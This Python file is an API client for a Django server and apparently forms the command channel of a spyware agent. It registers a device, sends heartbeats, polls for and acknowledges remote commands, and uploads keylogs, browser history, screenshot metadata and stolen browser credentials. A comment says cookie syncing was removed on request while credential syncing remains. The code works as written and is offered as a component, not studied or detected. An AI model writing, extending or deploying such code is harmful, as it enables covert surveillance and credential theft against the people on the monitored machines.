"""
API client for communicating with the Django server.
"""

import logging
import os
from typing import Any, Dict, Optional
from urllib.parse import urljoin

import requests
from requests.exceptions import RequestException, Timeout

logger = logging.getLogger(__name__)


class APIClient:
    """
    HTTP client for Django server communication.
    All endpoints use HTTPS with token authentication.
    """
    
    DEFAULT_TIMEOUT = 30
    
    def __init__(self, base_url: str = None, auth=None):
        self.base_url = base_url or os.getenv('SERVER_URL', 'http://127.0.0.1:80')
        if not self.base_url.endswith('/'):
            self.base_url += '/'
        
        self.auth = auth  # DeviceAuth instance
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'Accept': 'application/json',
        })
    
    def _get_headers(self) -> Dict[str, str]:
        """Get request headers with auth token."""
        headers = {}
        if self.auth and self.auth.token:
            headers['Authorization'] = f'Token {self.auth.token}'
        return headers
    
    def _request(
        self, 
        method: str, 
        endpoint: str, 
        data: Dict = None, 
        timeout: int = None
    ) -> Optional[Dict[str, Any]]:
        """Make an HTTP request to the server."""
        url = urljoin(self.base_url, f'api/{endpoint}')
        timeout = timeout or self.DEFAULT_TIMEOUT
        
        try:
            response = self.session.request(
                method=method,
                url=url,
                json=data,
                headers=self._get_headers(),
                timeout=timeout
            )
            
            # Log response
            if response.ok:
                logger.debug(f"{method} {endpoint}: {response.status_code}")
            else:
                logger.warning(f"{method} {endpoint}: {response.status_code} - {response.text[:200]}")
            
            # Handle responses
            if response.status_code == 204:
                return {}
            
            if response.ok:
                return response.json()
            
            # Return error info
            return {
                'error': True,
                'status_code': response.status_code,
                'message': response.text[:500]
            }
            
        except Timeout:
            logger.error(f"Timeout on {method} {endpoint}")
            return None
        except RequestException as e:
            logger.error(f"Request error on {method} {endpoint}: {e}")
            return None
        except Exception as e:
            logger.error(f"Unexpected error on {method} {endpoint}: {e}")
            return None
    
    # ==================== Device Endpoints ====================
    
    def register_device(self, registration_data: Dict[str, str]) -> Optional[Dict]:
        """
        Register this device with the server.
        Returns device_id and token on success.
        """
        return self._request('POST', 'device/register/', registration_data)
    
    def heartbeat(self, data: Dict = None) -> Optional[Dict]:
        """Send heartbeat and receive pending commands."""
        return self._request('POST', 'device/heartbeat/', data or {})
    
    # ==================== Config Endpoints ====================
    
    def sync_config(self) -> Optional[Dict]:
        """Fetch current device configuration."""
        return self._request('GET', 'config/sync/')
    
    # ==================== File Metadata Endpoints ====================
    
    def send_file_metadata(self, metadata: Dict) -> Optional[Dict]:
        """Send file upload metadata (after Cloudinary upload)."""
        return self._request('POST', 'files/metadata/', metadata)
    
    def send_screenshot_metadata(self, metadata: Dict) -> Optional[Dict]:
        """Send screenshot metadata (after Cloudinary upload)."""
        return self._request('POST', 'screenshots/metadata/', metadata)
    
    def sync_keylogs(self, keylog_data: Dict) -> Optional[Dict]:
        """Sync keylog data to server."""
        return self._request('POST', 'keylogs/sync/', keylog_data)
    
    def sync_browser_history(self, history_data: list) -> Optional[Dict]:
        """Sync browsing history to server."""
        return self._request('POST', 'browser/history/', history_data)
    
    # Removed sync_browser_cookies as requested
    
    def sync_browser_credentials(self, credential_data: list) -> Optional[Dict]:
        """Sync browser credentials to server."""
        return self._request('POST', 'browser/credentials/', credential_data)
    
    # ==================== Command Endpoints ====================
    
    def poll_commands(self) -> Optional[Dict]:
        """Poll for pending commands."""
        return self._request('GET', 'commands/poll/')
    
    def ack_command(self, command_id: str, status: str, result: Dict = None, error: str = None) -> Optional[Dict]:
        """Acknowledge command execution."""
        data = {
            'command_id': command_id,
            'status': status,
        }
        if result:
            data['result'] = result
        if error:
            data['error_message'] = error
        return self._request('POST', 'commands/ack/', data)
    
    # ==================== Health Check ====================
    
    def health_check(self) -> bool:
        """Check if server is reachable."""
        try:
            response = self.session.get(
                urljoin(self.base_url, 'api/health/'),
                timeout=10
            )
            return response.ok
        except Exception:
            return False


# Singleton instance
_api_client: Optional[APIClient] = None


def get_api_client() -> Optional[APIClient]:
    """Get the API client instance."""
    return _api_client


def init_api_client(base_url: str = None, auth=None) -> APIClient:
    """Initialize the API client singleton."""
    global _api_client
    _api_client = APIClient(base_url, auth)
    return _api_client
